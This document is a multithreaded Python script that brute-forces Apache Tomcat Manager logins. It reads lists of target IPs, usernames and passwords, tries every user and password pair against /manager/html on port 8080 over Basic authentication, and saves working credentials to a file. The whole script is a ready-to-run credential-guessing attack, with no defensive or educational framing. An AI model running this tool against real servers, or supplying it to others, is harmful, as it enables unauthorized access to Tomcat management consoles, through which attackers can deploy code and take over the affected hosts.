import requests
import base64
import queue
import threading
ip_list=queue.Queue()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": "1"
}
ips_file = "ip.txt"
port = "8080"
users_file = "users.txt"
passs_file = "pass.txt"
users_list = []
passs_list = []
thread = 500


def tomcat_brute():
    while not ip_list.empty():
        host=ip_list.get()
        url = "http://" + host + ":" + port + "/manager/html"
        end = 0
        try:
            req = requests.get(url, headers=headers, timeout=3)
            veri_data = req.text
            if "Apache" and "authentication" in veri_data:
                try:
                    for users in users_list:
                        for passx in passs_list:
                            payload = users + ":" + passx
                            headers["Authorization"] = "Basic " + base64.b64encode(payload.encode()).decode()

                            req2 = requests.post(url, headers=headers, timeout=30)

                            if end == 1:
                                break
                            if "Application" in req2.text:
                                end = 1
                                find=url + " - ok User:"+users+" Pass:"+passx
                                print(find)
                                with open("success.txt","a") as f:
                                    f.write(find+"\n")
                                break
                            else:
                                print(url + " - fail User:"+users+" Pass:"+passx)
                except Exception as e :
                    print("------------------",e)
                    exit(0)
        except Exception as e :
            print(url,e)



users = open(users_file)
while True:
    user = users.readline().strip()
    if user == "":
        break
    users_list.append(user)
users.close()
passs = open(passs_file)
while True:
    passx = passs.readline().strip()
    if passx == "":
        break
    passs_list.append(passx)
passs.close()
ips = open(ips_file)
while True:
    ip = ips.readline().strip()
    if ip == "":
        break
    ip_list.put(ip)
for i in range(50):
    threading.Thread(target=tomcat_brute).start()
ips.close()
